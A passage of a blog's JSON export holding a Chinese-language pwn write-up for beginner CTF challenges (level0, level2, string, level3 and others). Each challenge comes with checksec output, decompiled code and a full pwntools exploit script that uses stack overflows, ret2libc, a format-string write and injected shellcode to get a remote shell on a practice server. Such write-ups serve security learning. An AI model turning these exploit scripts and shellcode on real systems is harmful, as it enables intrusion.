class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level0\"><a href=\"#level0\" class=\"headerlink\" title=\"level0\"></a>level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/level0_$ checksec level0 </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/level0_/level0&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>同样是栈溢出，同时开启了NX，但是已经布置好system(“/bin/sh”)的函数，直接覆盖eip为0x400596即可。偏移为0x80。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400596                 public callsystem</span><br><span class=\"line\">.text:0000000000400596 callsystem      proc near</span><br><span class=\"line\">.text:0000000000400596 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000400596                 push    rbp</span><br><span class=\"line\">.text:0000000000400597                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:000000000040059F                 call    _system</span><br><span class=\"line\">.text:00000000004005A4                 pop     rbp</span><br><span class=\"line\">.text:00000000004005A5                 retn</span><br></pre></td></tr></table></figure>\n<p>注意rip后不要再跟多余的padding，否则等callsystem函数返回之后会报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level0\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31457</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x88</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Hello, World\\n\"</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p>根据提示可知该题是用ROP，即ret2libc。由于没有开启pie和canary，程序也直接调用了system函数，所以很简单，不需要leak libc基地址。用IDA可以找到/bin/sh字符串，然后用栈传参即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A024 hint            db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>\n<p>注意调整栈平衡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level2\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level2\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31463</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">rop += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804a024</span>)</span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p>该题开启了canary和nx。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/string$ checksec string </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/string/string&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>程序大意是类似一个MUD游戏，输入名字，输入east、up等用命令行与游戏交互，控制主角的行动。</p>\n<p>main函数中会首先malloc一个chunk，然后会leak出chunk的地址（即堆中D和U字符的地址）</p>\n<p>在sub_0x400bb9函数中存在格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">sub_400BB9</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"A voice heard in your mind\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"'Give me an address'\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%ld\"</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"And, you wish is:\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Your wish is\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(&amp;format, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"I hear it, I hear it....\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在最后的sub_0x400ca6函数中，如果之前的D和U两个字符相同，就会直接劫持控制流。此时只需要将shellcode布置到这块堆空间就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *chunk == chunk[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Wizard: I will help you! USE YOU SPELL\"</span>);</span><br><span class=\"line\">    v1 = mmap(<span class=\"number\">0L</span>L, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, v1, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (__fastcall *)(_QWORD, <span class=\"keyword\">void</span> *))v1)(<span class=\"number\">0L</span>L, v1);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>所以利用思路是：通过fs漏洞修改已知地址的D和U两个字符为相同值，然后直接读入shellcode。由于程序首先要求我们输入address，可以将要修改的地址先读入栈中，然后利用v2在栈中的相对偏移写入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"><span class=\"comment\"># elf = ELF(\"./string\")</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./string\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31504</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"we will tell you two secret ...\\n\"</span>)</span><br><span class=\"line\">addr1 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">addr2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr1),hex(addr2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What should your character's name be:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"So, where you will go?east or up?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"east\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">7</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"go into there(1), or leave(0)?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"'Give me an address'\\n\"</span>)</span><br><span class=\"line\">p.sendline(str(addr1))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"And, you wish is:\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">\"%085d%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-num\"><a href=\"#guess-num\" class=\"headerlink\" title=\"guess_num\"></a>guess_num</h2><p>该题也是栈溢出漏洞的利用，只需要覆盖掉srand函数的随机种子，然后就可以预测出rand()的序列，得到shell。</p>\n<p>预测序列的C程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  srand(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt;= <span class=\"number\">9</span>;++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num = rand() % <span class=\"number\">6</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, num);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>相应的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./guess_num\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31574</span>)</span><br><span class=\"line\">numbers = [<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Please input your guess number:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(numbers[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"int-overflow\"><a href=\"#int-overflow\" class=\"headerlink\" title=\"int_overflow\"></a>int_overflow</h2><p>该题开启了NX，没有开启PIE和canary。</p>\n<p>通过整数溢出漏洞溢出v3，过掉输入长度的校验（在3到8之间），顺便修改返回地址。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./int_overflow\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31580</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Your choice:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Please input your username:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"passwd:\\n\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.send(<span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + p32(magic) + (<span class=\"number\">262</span> - <span class=\"number\">0x18</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgpwn2\"><a href=\"#cgpwn2\" class=\"headerlink\" title=\"cgpwn2\"></a>cgpwn2</h2><p>该题是一个常规的栈溢出，构造很短的rop链即可。这里我使用了一条call system指令配合输入到bss段的/bin/sh字符串实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31688</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"here:\\n\"</span>)</span><br><span class=\"line\">payload = (<span class=\"number\">0x26</span> + <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804855a</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x0804A080</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>该题理论上是新手入坑中最难的一题，因为题目没有提供libc文件，并且system不是程序的导入函数，所以必须手动leak libc。注意由于一次溢出劫持控制流并不能完成利用，所以需要在leak libc之后返回到vulnerable function，再次溢出执行system(“/bin/sh”)。这里使用了LibcSearcher（<a href=\"https://github.com/lieanu/LibcSearcher\" target=\"_blank\" rel=\"noopener\">repo地址</a>）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span> ,<span class=\"number\">31718</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level3\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'write'</span>])</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">'__libc_start_main'</span>, addr)</span><br><span class=\"line\">libc_base = addr - obj.dump(<span class=\"string\">\"__libc_start_main\"</span>)</span><br><span class=\"line\">system = libc_base + obj.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh = libc_base + obj.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"新手练习when_did_you_borngets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x81<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}]}]}